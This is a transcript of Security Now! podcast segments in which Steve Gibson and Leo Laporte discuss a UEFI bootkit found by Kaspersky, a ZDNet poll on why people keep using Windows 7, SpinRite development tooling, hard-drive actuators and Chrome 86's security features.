Fortunately, UEFI firmware attacks remain rare because getting malicious code into the motherboard's firmware remains difficult.  Attackers still need either physical access to the machine, or they need to compromise the target through some sort of complex supply chain attack where the UEFI firmware or tools that work with UEFI firmware are modified to insert malicious code.  So again, not trivial.  This is not some email worm.  Kaspersky's malware researchers said they investigated some suspicious systems and discovered malicious code inside those systems' UEFI firmware.



The code, and I thought this was kind of cool, was designed to install or really copy, and reinstall or recopy, a malicious app as a Windows autorun program after every computer restart.  So even if the program was found and removed, at the next system boot it would reappear.  It would go into the auto start directory and autorun when Windows was started.  So that autorun program acts as a downloader for some other malware components which Kaspersky named the MosaicRegressor malware framework.  They said that they had not yet obtained and analyzed all of MosaicRegressor's components.



But the one they did look at contained functionality to gather all the documents from the recent documents folder, put them into a password-protected archive, and presumably prepare the files for exfiltration via some other component.  Of course it's typically not difficult to get something out of a system that's been compromised.  Especially if you are password-protecting an archive, and it's a well-designed archiver, then it'll be, as we know, maximum entropy noise, not subject to being discovered by anything that might be scanning it on the way out.  And if you had time, you could even send it out in little ping echo requests, a little bit at a time, because the payload of a ping can be, I think it's up to a Kbit, or maybe it's a Kbyte, of stuff.



Anyway, the researchers found the UEFI bootkit on only two physical systems, but they had found this MosaicRegressor component on many other computers.  Kaspersky believed that the targets of these attacks were all very carefully selected.  They were all diplomatic entities and NGOs located in Africa, Asia, and Europe.  So that's certainly not random.



They wrote:  "Based on the affiliation of the discovered victims, we could determine that all had some connection to the DPRK [North Korea], be it non-profit activity related to the country or actual presence within it."  And Kaspersky also discovered that the malicious UEFI code wasn't exactly new.  According to their analysis, the code was based on VectorEDK, which is a hacking utility to attack UEFI firmware, created by a now-defunct Italian vendor of hacking tools, exploits, and surveillance software that was known as Hacking Team.



And I remember when this happened, we talked about it at the time because we joked that "Hacking Team was hacked."  That's what happened.  Hacking Team were themselves hacked back in 2015; and their tools, including this VectorEDK toolkit, were all dumped online.  According to VectorEDK's manual, the tool was designed to be used with physical access to a victim's computer.  So that happened somehow for these well-placed specific PCs that had this rootkit EDK installed.  Kaspersky says that based on the similarities between VectorEDK and the modified version used by the Chinese group, the Chinese group most likely deployed their tool using physical access to their targets' computers, as well.  So same modus.



So we don't have some new pernicious UEFI attack vector.  It remains blessedly difficult to get malware down into our PC motherboards.  But we can also see that a sufficiently determined actor, especially one with state-sponsored control - and for that matter, what contemporary motherboard doesn't have some components sourced from China - is able to pull off such an attack.  So I got a lot of tweets about this, like uh-oh, another UEFI rootkit.  It's like, yeah.  But, boy, you know, it's nothing that is going to get any of us.  It's the kind of thing that really high-end elite systems are going to have installed on them.  And it requires a lot of planning and forethought to make that happen.



I have a piece of errata which appeared in the GRC newsgroups; and I looked for it again, and I couldn't find it.  But fortunately, Ian Butterworth tweeted to me, he said:  "Correction required.  Dr. John Campbell is not an M.D. doctor.  He's a retired nurse with a Ph.D."  Then he says:  "See his YouTube About."  And Ian said:  "Yes, his content is excellent.  I've been watching him for some time."  So I did want to correct the record.  We mentioned John Campbell last week with that YouTube piece where he was talking about - it's slipping my mind - the Vitamin D content, or the amount of Vitamin D that Dr. - I know it very well, I can't...



LEO:  Fauci?  Fauci?



STEVE:  Fauci, yes, thank you.  Dr. Fauci's Vitamin D consumption.  Thank you, Leo.



LEO:  Fauci?



STEVE:  Anyway, so John Campbell knows his stuff.  It's clear from watching his YouTube videos.  But not medical doctor, Ph.D. doctor.  So thank you, everybody, for the correction.



After my mention last week of GRC's forum availability, we experienced just a perfect level of influx of new members.  Today we have more than 2,800 members, and I'm completely happy with the way this is proceeding.  It's easier to handle a steady trickle than a stampede, which is what I was hoping to prevent when I actually had something available for people to download and play with and then report on.  So people coming in and saying hi and getting to know the place works well.  And a very nice community is establishing itself there.  So I could not be more pleased.



A couple of days ago I added a "What I'm working on right now" tracking thread to my personal blog forum so that those who wanted to know what's going on with me at the moment could easily check to see where I am along the way between here and having SpinRite 6.1 released.  So by watching that thread in my blog forum, or as we mentioned also by establishing our RSS feed, you just add a /index.rss to the end of the URL, and then you'll get updates.  So registration on the forum is still hidden from the non-podcast world, so those listening who are interested in grabbing their userID of choice before I open the forum more widely are still invited to sign up.  It's forums.grc.com/register.



So.  Why are people sticking with Windows 7?



LEO:  This I've got to hear.  I am baffled.



STEVE:  Yeah.  An interesting bit of research by ZDNet caught my eye.  ZDNet noticed that today, these days, nearly 10% of their website visitors were still running Windows 7, more than five years after the release of Windows 10 and, as we all know, despite Microsoft's extreme efforts to force everyone onto Windows 10.  Ed Bott, who grew up through the birth of the PC like the rest of us old-timers - you and I, Leo, know Ed's name well.



LEO:  Oh, he's on TWiT all the time, was just on a couple weeks ago.  We love him.



STEVE:  Yup, and he's been in the industry forever.



LEO:  Oh, yeah.



STEVE:  Noticed that their server logs were showing this and set up the poll.  So the poll setup read:  "Statistically speaking" - this is Ed - "one in 11 people reading this post on a PC are running Windows 7.  That's not speculation or guesswork.  That's what the ZDNet server logs for the last 90 days say.  Some 85.8% of the many millions of PC-based visitors to this site are running Windows 10.  Of the remainder, 9.2% are running Windows 7, which is twice as many as the Windows 8 and 8.1 population.



That data lines up pretty closely to public data from the United States government's massive Digital Analytics Program, which measures visits to more than 400 websites run by the federal government.  Over the same three-month period, their mix of traffic from PCs consisted of 85.9" - that's virtually the same - "Windows 10, 10.0 Windows 7, and 3.7 Windows 8.  That's a fairly significant drop from the last snapshot I looked at, which counted Windows 7's share of visitors at 18.9% in the 90 days leading up to that operating system's July 14th, 2020, end of support deadline."  And he references an article from then.



So, he says:  "The glass-half-full crowd says it's a good thing that half the population has stopped using Windows 7 in the nine months since Microsoft ended support for it."  He says:  "But I'm curious why so many are continuing to use Windows 7 past its expiration date.  Rather than speculate, I put together a poll.  Thanks to the more than" - oh, it's 3,200, not 38, as I said.  "Thanks to the more than 3,200 people who responded.  I'll share the results next week."



Well, that was a week ago.  Now we have the results.  He posted yesterday on ZDNet.  He said:  "Our ZDNet poll drew more than 3,200 replies, along with 50 or so emails.  The results are fascinating.  Let's start with the two easiest questions.  Do you plan to upgrade to Windows 10 in the next 12 months?  The answer to this question was pretty emphatic.  Just under 58% replied 'no,' with another 27% answering 'not sure.'  Only 16% said 'yes.'"



He says:  "Several respondents pinned the blame for the slow upgrade on corporate IT departments, with two respondents saying that the Covid-19 response had caused issues with completing upgrades within their organization.  Others pointed to IT departments that are 'understaffed' and 'incompetent' and 'taking their time.'"



LEO:  It's [laughing] rude to say, well, that's because I have an incompetent IT department.



STEVE:  They're not that good.  We all wish we had Windows 10, but we're still stuck with [crosstalk].



LEO:  That's so rude.  So rude.



STEVE:  He said:  "In all, roughly 1% of respondents specifically mentioned that they were prohibited from upgrading because they were using a company PC and not a personal device."  Don't you touch that.  It's working just fine.



Okay.  Next question:  "Are you paying for extended support?"  That is, has your Windows 7 support not actually ended?  He says:  "Although Microsoft has stopped releasing monthly updates to the general public, those updates are still available for those" - which bugs me - "for those who purchase Extended Security Updates (ESUs)."  He says:  "They're not cheap," and they get progressively more expensive, as we know, every year.  "And they're not easy for small businesses to acquire," he says, "as I noted at the beginning of this year."  Because earlier he wrote a piece titled "You want to keep running Windows 7?  Good luck with that, small businesses."



Anyway, he says:  "Perhaps that explains why only 6% of poll responders said they are paying for ESUs, with another 3% admitting they're not sure.  The remaining 91% are, apparently, going without."  And that's the camp I'm in.  I'm going without.  I'm sitting in front of Windows 7 right now.  Works great.  He said:  "In the longer responses, some people took pains to note that their Windows 7 machines aren't connected to the Internet."  Okay.  "Others pointed out that they had up-to-date security software."  I guess.  "And a few said they thought Microsoft was exaggerating the threat posed by running unsupported software in a bid to squeeze more money out of customers."  Fair enough.



Okay.  So big third question:  "What is the main reason you have not upgraded?"  Ed says:  "Here's where things got interesting.  The original survey contained four choices and a box labeled 'Other,' where respondents could fill in their own answers.  Nearly a thousand people chose 'Other' and then wrote in their reason."  He says:  "I read every one of those responses and categorized them manually.  About 10% of the responses could not be categorized because the reason was indecipherable or irrelevant.  That left a total of 2,855 usable responses."



So out of a universe of 2,855 usable responses, here's how they broke down.  And this I found really interesting:  42% said compatibility.  "The number one reason people are sticking with Windows?"  Ed says:  "There's no contest.  Compatibility issues, hardware and software, wins in a landslide.  Fully 40% of respondents chose that answer, and another 2% or so selected 'Other' and then identified a compatibility issue.  The specifics include some esoteric equipment, including one person with a legacy CNC milling machine" - Computerized Numerical Control milling machine - "plenty of old peripherals that don't have Windows 10 drivers, and several people who paid for Adobe Creative Suite perpetual licenses and have no desire to upgrade."  He said:  "Among the write-in responses, the biggest group was made up of fans of Windows Media Center, who collectively added up to roughly 1.5% of respondents."  He said:  "Their loyalty is impressive."



Okay.  42% compatibility, number one.  Number two, a third, 32%, don't want to upgrade.  He said:  "About 17% of respondents chose the ready-made 'Just don't feel like upgrading' answer from the poll form.  But I counted nearly the same number of people who chose the 'Other' box and then made it clear from their reply that they had picked Windows 7 over its logical successor, Windows 10.  I sorted those replies into four buckets, in the following order.



"People who just don't like Windows 10 made up the biggest chunk of respondents.  People called out the user interface, bugs, and stability in particular.  About one in four of the 'I don't like Windows 10' group used strong enough language that I created a separate 'Windows 10 sucks' category.  Many used that exact phrase, while others threw in overheated words like 'garbage,' 'crap,' 'dumpster fire,' and a few choice phrases that I can't repeat here.  In all, those first two groups added up to about 10% of total responses.  A slightly smaller camp had no particular problem with Windows 10, but preferred Windows 7.  Just under half of this group..."



LEO:  You influenced a lot of that previous group.  You know, Steve Gibson says it's a polished turd, so that's why.  That's all you need to know.  Sorry, I didn't meant to interrupt.  Then there's another group.



STEVE:  Yeah.  "Just under half this group praised Windows 7 because 'it just works.'"



LEO:  Yeah, or not.



STEVE:  "A slightly larger group said they believe Windows 7 is better than Windows 10.  They praised the user interface - 'much more user friendly,' or 'the last usable version.'"



LEO:  You know, all of that's legit.  It's not that it's not legit; right?



STEVE:  Yeah.



LEO:  It's just that it's insecure.



STEVE:  Yeah.  Works great.  "And called out Windows 7 for its stability."  I mean, look at what - this year has been about Windows 10 disaster after disaster after disaster.



LEO:  Oh, it's a nightmare.  Yeah.



STEVE:  My printer, I can't print anymore.  I just lost all of my programs and documents.  They're all gone.  What?  Anyway.



LEO:  Now, did you feel like that's worse with 10 than it was with 7?  It feels like it, but I can't - I don't remember specifically; you know?



STEVE:  Oh, yeah.



LEO:  It seems worse, huh.



STEVE:  Oh, yeah.  I don't remember that with 7.  7 was mostly sort of a refrosted XP.



LEO:  Right, right.



STEVE:  They weren't really trying to do that much to it.



LEO:  Maybe that's it, yeah.



STEVE:  They've really gone crazy with Windows 10.  Anyway, so he said:  "A word that appeared over and over again was 'control,' especially in the context of security updates."  He says:  "More on that in a minute."  He says:  "In all, it seems appropriate that the two groups of Windows 7 fans added up to about 7% of the survey respondents."



And then, in something curious, 10% said "Upgrade is too expensive."  And Ed wrote:  "I was surprised that so many people chose that option, especially when the Windows 10 upgrade is free.  The most poignant example came from a reader in Iran, who said:  'In Iran we have a bad situation, and the cost of the upgrade was too high.'"  Okay.  5% said "Updates are too intrusive."  He said:  "An unsurprising number of people expressed their extreme displeasure with forced updates, buggy updates, and the feature churn with twice-yearly feature updates.  'I've never had to reinstall an OS due to a borked update,' said one respondent.  'That seems to be a regular occurrence with Win10.'  Continuing the theme of loss of control, another person said, 'I own my computer, and I will decide when to update, not Microsoft.'"



And then, down at 3% was privacy, telemetry, and spying.  He says:  "I was just a bit surprised that this number was so low;  but what they lacked in numbers, this group made up for in, well, let's just call it passion, using multiple variations of the word 'spying' as well as 'privacy' to express their discontent for Microsoft's 'telemetry,' which is apparently a dirty word.  Another 1% or so specifically called out the word 'trust,' and a handful described their hatred for Microsoft using language that my editors would be extremely displeased to see me repeat on this website."  And he said:  "Perhaps the best response in this group was this one:  'This is BIG BROTHER, brother.'"



Finally, 3% were "afraid to upgrade, can't upgrade, too busy."  Ed wrote:  "Not everyone who responded to the survey was dismissive of the idea of upgrading.  A significant number of people said they were afraid to upgrade because they worried they would lose data or programs in the process.  This category also included people who said they were just 'too busy' to upgrade, or that they couldn't afford the time to reinstall programs and reconfigure system preferences.  About a third of the responses in this group" - that would be down at 1% - "said their hardware was too old to upgrade, or that they had tried and failed.  But my favorite reply was a single word, just in quotes: 'Laziness.'"  Okay.



LEO:  Fair enough.  Fair enough.



STEVE:  3% had training and support issues.  He said:  "Honestly, I expected this group of responses to be bigger, but it looks like most corporate customers aren't particularly worried about users being able to adapt to change."  And, finally, the least frequently cited reason, at 1% - okay, so what would that be?  That would be shy of 300 of the respondents said, "I'm moving to Linux."  Ed said:  "And finally, it just wouldn't feel right if I ignored the handful of respondents" - oops, no.  So less than 1%.  He said:  "24, to be exact, who said they either have switched to Linux or are just about to do so."



So anyway, looking over those numbers, I was surprised that 42% cited compatibility issues.  Ed mentioned some old CNC equipment whose drivers were unsupported by Windows 10.  And I think that probably we think too often of Windows systems in the generic desktop role, desktop workstation role.  But for example, my dentist's office is still using Windows 7 for its patient records management.  And the app that runs the digital X-ray machine and displays the digital X-ray images I note is hosted on Windows 7.  Who knows whether that would run on Windows 10?  And I'm sure they're not wondering.  It's a case of, if it's not broke, don't fix.  So even if compatibility were not an issue,  it could also fall into the 32% who just don't want to upgrade.  It's like, it's running just fine.



And one advantage of using Windows 7 for non-desktop applications like that, X-ray machine, is that Microsoft cannot force the system to upgrade or else.  I certainly do find much to agree about with those users who say this is my computer, darn it.  I'll decide what software it runs and when.  So anyway, I guess someday that attitude will be considered quaint.  And I should just note, I'm now freely using two machines.  Today I use Windows 7 and Windows 10 every day, a different workstation at each of my two sites.  I'm sitting in front of a Windows 7 machine here.  In the evenings I use Windows 10.



And what I think will eventually happen is that Windows 7 will become too old, and things that I want will not be available for it.  That's what happened with XP.  Both Mozilla and Google had refused to continue updating their browsers just because I was still using Windows XP.  Otherwise, it was a perfectly functioning OS.  And of course IE had died on it ages ago.  And as it happens, just last night I wanted to install the Calm Radio app for background ambient music while I'm working.  The Windows 7 app is nowhere to be found.  Now it's Windows 8 and 10 only.  So as it happens, I ran it on iOS, which worked just fine.



But I'm sure at some point I will rebuild this Windows 7 machine when it just becomes too old, when the things I want to do with it are no longer available on it.  And then I'll move to Windows 10.  And I have experience with it now.  I'm using it in the evenings.  And right now I've got Windows Defender, which is keeping itself current and keeping an eye on the system, and all my browsers.  Firefox and Chrome are both being updated, as is Edge.  So I'm good for the time being.  And I know, Leo, you're sort of in Linux; right?  Is that where you are now?



LEO:  Yeah, Linux and Mac.  I don't actually have any Windows machines at this point.  I mean, I should.  And I'll probably find one somewhere.  But, yeah, I don't have any Windows 7, for sure.



STEVE:  Well, I know what's going to happen is somebody will finally put it on some really tasty hardware that you have to have.



LEO:  Yeah. 



STEVE:  And so that'll...



LEO:  So what happens is I buy - in fact, there is.  There's like - although I'm waiting for Apple Silicon.  But there's like a new HP Elite, which they're beautiful computers.  But what ends up happening is I just buy the Windows machine and put Linux on it.  After about six weeks with Windows I go, that's it.  I'm done.



STEVE:  Yeah, I know.



LEO:  I'm surprised that you've survived.  But you have to; right?  You have to.



STEVE:  Well, and frankly the developer tools, that's really one of the things that Microsoft really got right in the beginning.  They created some world-class developer tools for Windows.  And, well, also for the work on SpinRite and Beyond Recall, that's still DOS.



LEO:  Right, you had to do that.



STEVE:  And soon it will be UEFI with no DOS.  So I really do.  It's just better for me to be developing on Windows.



LEO:  I don't know.  Emacs with assembly is pretty good.  You should really consider it.  I'm just saying.  I know.  You're still using Brief; right?



STEVE:  No, I had to give it up.  It was 16 bits.



LEO:  Oh, oh.



STEVE:  Yeah.  And I'm glad.  I made the switch.  Although I am Visual Studio 2008, so I'm staying as old as I can.



LEO:  Visual Studio is pretty nice.  I actually use, even on Linux or Mac, I use Microsoft's open source VS Code, which is kind of a simplified Visual Studio.  And I really like it.  I use it all the time.  Right now I'm studying Haskell, and it's a very, you know, the hardest thing about Haskell, the reason I've kind of turned my back on it is the tooling is so nuts.  It's just crazy.  It's not anything like - it's not like you write a text file and you compile it.  It's much more complicated than that.



And finally, the Haskell community has finally addressed that.  There's a very good VS Code plugin.  Ghcup is a very easy way to install it.  And so tooling, I don't - I completely agree with you.  Tooling is 99% of it.  Even I'm sure for assembler.  If you've got the right tools, then the job is a lot easier.  Debugging, testing.  How do you test - that's the other thing.  Do you have some sort of test harness for hard drives?  Or how do you examine hard drive behavior?



STEVE:  So the first thing I did when I returned to this project was to create a development environment that would be comfortable.



LEO:  There you go.



STEVE:  And so because I'm DOS-hosted - and I had a weird problem with Windows 10 because the DOS Samba client, Windows file and printer sharing, was so old for DOS that it didn't do the encryption that Windows 10 was insisting upon.  



LEO:  Oh, so it couldn't read your drive.



STEVE:  So I fought with that.  But now what I have is I have a side-by-side, or actually Oracle's Virtual Box.



LEO:  Ah, perfect.  There you go, yeah.



STEVE:  I'm able to bring up a Virtual Box VM.  It's networked into the network, so it's able to see my development directory, so I'm able to run the debugger.  I'm using SoftICE, which was the best debugger back in the day.  So I've got SoftICE on DOS.  And so I can just hit - I just hit G and Enter, and immediately I'm in the code.  The debugger pulls the source from the Windows directory.  So I'm doing source-level assembler debugging, able to single step and watch the stack and all the registers and all that, but actually running in DOS.  And so some of the things I can do there.



Some of the actual hardware stuff I need to use an external machine.  So I have there an external box that boots FreeDOS, same network stack, in order so that it can see into my Windows directory.  And then I just have a freestanding DOS machine.  So having a comfortable development environment, because I plan to be doing this full-time now for the foreseeable future, that's the first thing I needed to establish.



LEO:  Yeah, I would imagine, yeah.  That's another kind of tooling.



STEVE:  And it's not easy because this stuff's getting so old.



LEO:  Well, then, so are we, Steve.  So...



STEVE:  Yes.  We'll all fade at about the same time.



LEO:  Better not.  Better not fade.  Keep going.  Steve Gibson.



STEVE:  I figure I've got another 20 years in me.



LEO:  That's good.  I like hearing that.  Steve is at GRC.com.  That's his website.  That's where you'll find SpinRite.  That's the product he's talking about, his bread and butter, the world's finest hard drive recovery and maintenance utility.  Soon development continues apace on v6.  And if you buy it now, is it 6 or 6.1?



STEVE:  We're going to 6.1.



LEO:  6.1.



STEVE:  We're now at 6.



LEO:  If you buy 6 now - I don't know why I forgot that, spaced that out.  6.1 is in active development.  You'll get to participate in that.  And of course you'll get an upgrade automatically, too.  If you're there, check out all the other wonderful things, wonderful things Steve has to offer, including this show.  He's got 16Kb audio for our friends in Australia and otherwise bandwidth-impaired.  He has a transcript that's unique to his site.  No one else has that, either.  And that's really a useful tool for people who want to read along and learn from the show.  I know people learn a lot listening to this show.  You can also get 64Kb audio at his site. 



We have both 64Kb audio and video at TWiT.tv/sn.  You can also subscribe.  There's a YouTube channel, if you want to watch the video only.  And if you have a podcast player you could probably subscribe there, too.  Security Now!'s been around for 15 years.  I would imagine by now they would have added it to their directory.  If they haven't, I think they never will.  It's too late.



Steve, we will see you next week.  We'll be coming off the iPhone announcement.  I'll actually be curious.  I know you're an iPhone user.



STEVE:  Yeah.



LEO:  If you see any compelling new features, it'll make you want to buy it.  Did you upgrade to 11?



STEVE:  No.  I have 10.



LEO:  Yeah.  So this might be one you want to look at.  We'll talk next week about that.



STEVE:  Okay.



LEO:  Thanks, Steve.  See you next time on Security Now!.



STEVE:  Thanks, buddy.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#788

DATE:		October 13, 2020

TITLE:		Well-Known URIs

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-788.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we catch up with Chrome 86's handful of security-related improvements.  We touch on several recent ransomware events and on the consequences of not logging free WiFi users in France.  We look at the results of an amazing bit of hacking of Apple, give an update on the enduring Zerologon threat, introduce the revenge of DNT with legislation-enhanced GPC, and describe another renewed attack on undecryptable E2EE now by seven countries.  Then, following a bit of SpinRite and GRC forum news, we're going to add the concept of IANA-registered well-known URIs to our bag-of-tricks knowledgebase.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with lots to talk about.  Chrome gets 86'd.  Make good money hacking for Apple.  And why three French cafs just got busted for not logging WiFi access.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 788, recorded Tuesday, October 13th, 2020:  Well-Known URIs.



It's time for Security Now!, the show where we protect you and your loved ones, online and off, with this guy right here, Mr. Security & Privacy himself, Steve Gibson.  Steve, I had to laugh.  After 5G, the most repeated phrase in the Apple event today was "security and privacy, security and privacy, security and privacy."  Clearly they see that as a real selling point.  And I guess they're probably right.



STEVE GIBSON:  And Leo, it's funny you should mention those two topics because we have some things to say today about questions and solutions and issues in security and privacy.



LEO:  Oh, how nice.  How clever.



STEVE:  As a consequence of two stories that we'll talk about, Chrome 86, which is not something that you want to 86 because it's good.  Those who spend any time in the food services industry may recognize that "86" is a special number, largely within that community.  And also, what was it, it's another feature that we'll be talking about.  Both stories tie into something that we've touched on a couple times.  But it turns out, and I was unaware of how much it had grown, and so we need to add this to our bag-of-tricks knowledge base.  There is a formal registered, as in IANA registered, set of well-known URIs which the more I look at this, the more bullish I become.  So that's the title for today's podcast, well-known URIs, Security Now! #788.



But we're first going to catch up with Chrome 86's handful of security-related improvements.  We touch on several recent ransomware events, just briefly but to kind of keep our toe in the water.  I had a couple people write and say, you know, Steve, you seemed self-conscious about talking about ransomware.  But that's what the podcast is about.  Okay, but yes, not to excess.  Also some bizarre consequences of not logging free WiFi users in France.  We'll look at the results of an amazing bit of hacking of Apple, their cloud-based services, and what resulted from some good guys taking a close look at that.  Also an update on the enduring Zerologon threat.



We're going to introduce the revenge of DNT with new legislation-enhanced GPC.  Also another renewed attack on undecryptable end-to-end encryption, now coming from seven countries.  Two more have jumped in.  Also I have a little bit of update on SpinRite, something on the GRC forums news, and then we're going to take a look at this really interesting addition to the Web API IANA-registered well-known URIs, which I think everyone is going to find interesting.  Oh, and we do have sort of a mind-blowing Picture of the Week.  Just for those who didn't already think that hard drive technology had already totally jumped the shark, boy, this picture will convince you.



LEO:  Yeah, yeah.  All right, Steve.  You want to take a look at this picture now?



STEVE:  This is just mind-boggling.  Everyone's wondering how, well, people who have been in the industry for a long time certainly, how it can possibly be that our hard drives are storing the kind of density that they are.



LEO:  I bought a 16TB hard drive the other day.  16 terabytes.



STEVE:  Yeah, 16 trillion 8-bit bytes.



LEO:  It's amazing.



STEVE:  Unbelievable.  And they're not expensive.



LEO:  No.



STEVE:  I mean, it's just - it's crazy.  So get a load of this.  This is a picture of the actuator system which Western Digital is using, and presumably others also.  We're all sort of familiar with the idea of a voice coil mechanism that rotates the arms out onto the disk surface where at the end is a head mounted on the end.  And you could have like stacks of platters that have these arms on both sides.  So that was then.  The problem is there's a lot of inertia, and all the heads have to be positioned in exactly the same place.  So what this thing does, where we are today is a compound three-stage actuator where you still have what is now considered gross positioning by the voice coil, which sort of swings the whole head tower in and out on the drive to get the heads...



LEO:  Is that how they used to work?  Or, I mean, was that the whole thing in the old days?



STEVE:  Yeah, that was all that we used to have in the old days.  Now, because tracks have become so close together, and because vibration - we've talked about, like, remember the guy screaming at his hard drives and suddenly throughput dropped?  It's because just the acoustic energy of the sound waves hitting the side of the drive was enough to push the heads off-track.  I mean, it's like they could be used to detect earthquakes in China.  I mean, they are so sensitive now.



LEO:  Wow.  Wow.



STEVE:  So what they've done is they've now got two additional actuating systems.  Out near the heads is the so-called milliactuator, which servos like the last half inch or so, and then at the head is a microactuator which does the third degree of positioning.  So imagine the technology that goes into this thing.  It's like, oh, yeah, okay, we've got triple actuators.  Yeah, but you have to actually run them.  I mean, you have to figure out whose job it is.



LEO:  It's mindboggling.



STEVE:  At which stage.  And the fact that you've got the head tower, which they all share, but notice that the milliactuator and the microactuator are per head, which means you can now be individually servoing all 18 heads on this nine-disk platter independently in order to keep them all on track.  It's just, to me...



LEO:  Amazing. 



STEVE:  And it's cheap.  It's not a fortune to buy one of these things.  Yet we just sort of take it for granted, oh, yeah, I got 18TB.  That ought to last a while.  It's like, oh, my god.



LEO:  It's the story of technologies.  Although I know you and I, well, I don't know about you, but I thought the year 2000, 20 years ago, I thought, well, there's only a few years left in hard drives, and we'll be all solid state or something else by 2010.



STEVE:  Oh, we're going to have - remember we talked about it, those really cool wafers that Star Trek had.  We're just going to have wafers.  Just stick the wafer in the slot.



LEO:  But they've managed to really get a lot more life out of these things.



STEVE:  Unbelievable.



LEO:  You know we just did the Apple iPhone event.  That processor is 5 nanometers, and one processor has 11.8 billion transistors.  It's got six cores, four GPU cores.  It's the size of your pinky nail in your phone, 12 billion transistors.  It's mindboggling.



STEVE:  And runs on a battery.



LEO:  Yeah, and runs on a battery, yeah.



STEVE:  It used to be that the air conditioning was larger than the computer that you had.



LEO:  Right, right, right.



STEVE:  Unbelievable.



LEO:  It's great.  I mean, we live in amazing times.  We really do.



STEVE:  Yes, children, this podcast is being operated by old people who remember the abacus and actually had to use one once.



LEO:  I had a caller on the radio show on Sunday who's 91.  Or maybe Saturday.  Who's 91.  And I was saying, wow, you've seen a lot of changes.  I was talking about the phone company.  He said, "I remember before there were phones."  You know, nobody had a phone.  I said, "Oh, my god, let alone a phone in your pocket that can contact anyone in the world for free."



STEVE:  Well, and we've talked about this before.  You would pick up the phone and see if anybody else was on the line.



LEO:  Yeah, party line, yeah.



STEVE:  Because it was often shared.  And then you'd flash the hook switch a few times to get the attention of an operator somewhere.  Oh.



LEO:  Operator.  Operator.  And she would physically connect a cable that joined you and the person you were calling via a single wire.



STEVE:  Yeah.



LEO:  Wow.



STEVE:  So going from there to a thousand miles an hour, we have last week's release of Chrome 86.  The main theme for 84 was updates to its UI.  We got a bunch of user interface improvements there.  Then 85 came along, which was mostly about performance and some new API stuff.  Last week's Chrome 86, which was dropped into the stable channel on Tuesday - I think they do that on purpose just to get us because I'm always then a week behind - focuses primarily upon enhanced security features, so apropos for the podcast, and even some additional - although wait till you hear about this API enhancement.  I'm not too sure.  It's definitely in the "what could possibly go wrong" category because it allows access to the entire file system of its hosting OS.



LEO:  Ooh.



STEVE:  But more on that in a minute.  So as usual, your particular Chrome instance may need, as mine did, at both locations, last night and this morning, a bit of encouragement to get it to jump from 85 to 86.  I've been using it daily.  I kind of run both Chrome and Firefox for different purposes.  Even though Chrome was a week old, 86 was a week old, and it had been out there, it still wasn't until I went to Help > About that it came up and said, oh, yeah, I've got some updates to do.  It had been running 85 point something or other.  And now it's at 86, but only when I went to look.  So if anyone's interested, I'm sure it would finally get around to updating itself, but I like to have the current one, as our listeners probably do.



Okay.  So last December we were at 79.  And the desktop versions of Chrome acquired what they called at the time the "password checkup feature," which would scan the user's saved-in-Chrome and synced passwords for any collisions with known leaked passwords from other sites' data breaches.  Chrome renamed that feature "Safety Check" in May, and now this very useful feature has been added with 86 to the mobile editions of Chrome for both Android and iOS.  So that's new.  Also with 86 we now have built-in support for a particular type of well-known URI.  And it was the much more broad and general use case for this feature, which has just been added to 86, that was the first impetus for this week's podcast topic.  So we'll get back to that when we wrap up the podcast here in another hour and a half or so.



Chrome users on iOS are also getting a new touch-to-fill feature which Android users have had since July.  It's essentially biometric authentication for password-filling on iOS.  Chrome detects the site that the user is navigating around and will then automatically prompt the user to autofill passwords if it has credentials saved for the site.  Since Chrome will only trigger on an exact domain name match, this has the benefit which Google has been touting, which is of course common for all password managers that match on domain names, of helping to avoid phishing and visually close spoofed site names.  And since iOS now offers strong biometric support, Chrome 86 will support that when it's available in the hardware, requiring a quick biometric reauthentication before it will autofill.



And of course we've all had this with our industrial strength add-on password managers for some time, so none of this is news for most of us.  And our password managers of course are not only cross-platform, but also cross-browser make, which Chrome of course is not.  It's going to keep it in the family.  My LastPass works on Chrome and on Firefox, Mozilla, and Safari and so forth.  So still for me that's the better solution.  But there are many people who have still not made that leap to a third-party password manager.  And if we haven't got them by now, it seems unlikely that we will.  So certainly building much stronger security into the base browser, which everyone is always going to be using, seems like a useful compromise.



Also in May of this year, with Chrome 83, our desktop Chromes acquired the Enhanced Safe Browsing feature to provide more phishing and malware detection.  With 86 last week, the mobile platforms also have both acquired that protection, as well.  I was surprised to learn that earlier versions of Chrome, prior to 86, weren't already warning their users when submitting insecure form data.  That seems like a no-brainer which we of course on this podcast have been talking about for like a decade.  But at least Chrome 86 is now offering that protection, as well.  It gives you a clear warning if you are on a secure page whose Submit URL is not secure.



Again, we've been talking about this forever.  But it's listed in new features for Chrome 86, so okay.  And it will continue with its warning and blocking when downloading insecure assets from secure pages.  In 86, executable and archives are blocked by default, while Chrome shows warnings for Office-related document downloads.  Again, you can bypass the warning, but it's like, make sure this is what you want.



And we've noted that browser-based File Transfer Protocol - remember FTP - is not long for this world.  Its death will be occurring in stages, and that begins now.  With last week's Chrome 86, FTP will still be enabled by default for most - and this is weird, but bear with me - stable channel users.  It will be disabled for the canary and beta pre-release channels.  I said "most stable users" because, oddly, FTP will also be experimentally disabled for 1% of stable users.  Okay.  So I guess they just don't want to break anything that they may not be aware of, although you'd think that their telemetry would have long ago told them, I mean, I'm sure it did, how many people are actually clicking on FTP links these days.



So if you find that it's disabled for you, and you need it, after you get through asking yourself why - and really do take a moment - 86 will allow you to reenable it from the command line using the --enable-ftp command line flag, should you need to.  When we get to Chrome 87, the disabled percentage will be increased to a coin toss with 50% of Chrome's 87 users discovering, well, hopefully not discovering to their dismay that their favorite FTP resources can no longer be downloaded.



